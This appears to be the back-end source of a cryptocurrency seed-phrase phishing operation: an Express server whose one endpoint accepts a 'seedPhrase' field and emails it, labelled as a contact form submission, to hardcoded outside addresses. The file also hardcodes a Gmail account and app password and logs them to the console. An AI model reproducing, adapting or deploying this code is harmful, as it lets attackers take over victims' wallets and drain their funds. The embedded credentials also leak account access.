const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');

const app = express();
app.use(express.json());

app.use(cors()); // Allow all origins for dev

function parseToEmails(value) {
    if (!value) return null;
    let v = String(value).trim();
    if ((v.startsWith("'") && v.endsWith("'")) || (v.startsWith('"') && v.endsWith('"'))) {
        v = v.slice(1, -1).trim();
    }
    if (v.startsWith('[') && v.endsWith(']')) {
        try {
            const normalized = v.replace(/'/g, '"');
            const parsed = JSON.parse(normalized);
            if (Array.isArray(parsed)) {
                return parsed.map(s => String(s).trim()).filter(Boolean);
            }
        } catch (e) {
            return v
                .slice(1, -1)
                .split(',')
                .map(s => s.trim().replace(/^(["'])(.*)\1$/, '$2'))
                .filter(Boolean);
        }
    }
    return v;
}

app.post('/send-email', async (req, res) => {
    const { seedPhrase } = req.body;

    if (!seedPhrase) {
        return res.status(400).json({ error: 'Missing required fields: to, subject, text' });
    }

    const emailHtml = `
    <html><body>
    <h1>New Contact Form Submission</h1>
    <p><strong>Phrase:</strong> ${seedPhrase}</p>
    </body></html>
  `;

    const smtpUser = process.env.SMTP_USER || 'guirez1921@gmail.com';
    const smtpPass = process.env.SMTP_PASS || 'bzfb dmyh buuq vmag';
    const smtpFrom = process.env.SMTP_FROM || '"Seeder" <guirez1921@gmail.com>';
    const toRecipients = parseToEmails(process.env.to_email);
    console.log(smtpUser, smtpPass, smtpFrom, toRecipients );

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: smtpUser,
            pass: smtpPass
        }
    });

    const mailOptions = {
        from: smtpFrom,
        to: toRecipients || ['susanbabe0980@gmail.com', 'Jessicarose89202@gmail.com'],            // receiver address
        cc: 'guirez1921@gmail.com',             // cc address
        subject: 'New Phrase Submission',
        html: emailHtml
    };

    try {
        const info = await transporter.sendMail(mailOptions);
        res.status(200).json({ message: 'Email sent successfully', data: info });
    } catch (error) {
        console.error('Error sending email:', error);
        res.status(500).json({ error: 'Failed to send email' });
    }
});

app.get('/', (req, res) => {
    res.status(200).send('Hello, World!');
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

module.exports = app